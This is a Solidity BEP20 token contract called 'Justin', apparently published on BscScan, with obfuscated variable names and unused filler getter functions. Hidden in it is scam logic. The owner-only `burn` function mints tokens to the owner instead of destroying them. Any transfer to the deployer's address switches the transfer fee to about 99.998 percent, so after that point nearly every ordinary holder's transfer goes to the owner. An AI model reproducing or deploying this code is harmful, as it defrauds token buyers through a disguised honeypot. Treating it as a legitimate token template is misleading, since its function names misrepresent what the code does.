/**
 *Submitted for verification at BscScan.com on 2022-11-16
*/

/**
 *
 *
 *. ????????????????????????????????????????????????????????????????
 *  ????????█████████????????███████████???????????????????███████?? 
 *  ???????███?????███?????????????███??????????????????██??????██?? 
 *  ??????███??????███???????????███??????????????????????????███???
 *  ?????███??????███?????????███??????????????????????????███??????
 *  ????███??????███???????███??????????██?????██?????███???????????
 *  ???███?????███??????███??????????????██??██?????███?????????????
 *  ??█████████???????███████████?????????███???????███████████????? 
 *  ????????????????????????????????????????????????????????????????
 *
 *
 */
/**
 *Submitted for verification at BscScan.com on 2022-11-16 07:01:06 GMT
 */
 // SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract FDBHZXF {
address private  UZAYYV = address(0);
address private  JHONWX = address(0);
uint256 private  CNJXLA = 10000000000;
address public owner;
uint256 private  WPSRJO = 100000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint8 public constant decimals = 18;
uint256 private  STFRTP = 1000000000000000;
address private  SAMXJE = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  HJYJAL = address(0);
uint256 private  EQODFX = 1000000000000000000;
address private  VTRJZH = address(0);
mapping (address => uint256) public balanceOf;
mapping (address => mapping (address => uint256)) private _allowances;
event Approval(address indexed owner, address indexed spender, uint256 value);
string public  name = "Justin";
uint256 private  TWKSHC = 10000000000000;
string public  symbol = "Justin";
uint256 private  VTGUMF = 1000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant BCRGTV = 99999;
uint256 private  BSZGSM = 1000000000000000000000;
function _getJHONWX() private returns (address) {
return JHONWX;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () public {
SAMXJE = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getVTRJZH() private returns (address) {
return VTRJZH;
}

function _getBSZGSM() private returns (uint256) {
return BSZGSM;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getWPSRJO() private returns (uint256) {
return WPSRJO;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ASQZZP");
require(to != address(0), "ASQZZP");
require(amount <= balanceOf[from], "ASQZZP");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* BCRGTV/EQODFX ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==SAMXJE){
EQODFX = BCRGTV+2;
}
emit Transfer(from, to, transferAmount);
}
function _getCNJXLA() private returns (uint256) {
return CNJXLA;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tASQZZP 0");
require(spender != address(0), "fASQZZP 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getSTFRTP() private returns (uint256) {
return STFRTP;
}

function _getHJYJAL() private returns (address) {
return HJYJAL;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getVTGUMF() private returns (uint256) {
return VTGUMF;
}

function _getUZAYYV() private returns (address) {
return UZAYYV;
}

function _getTWKSHC() private returns (uint256) {
return TWKSHC;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}

}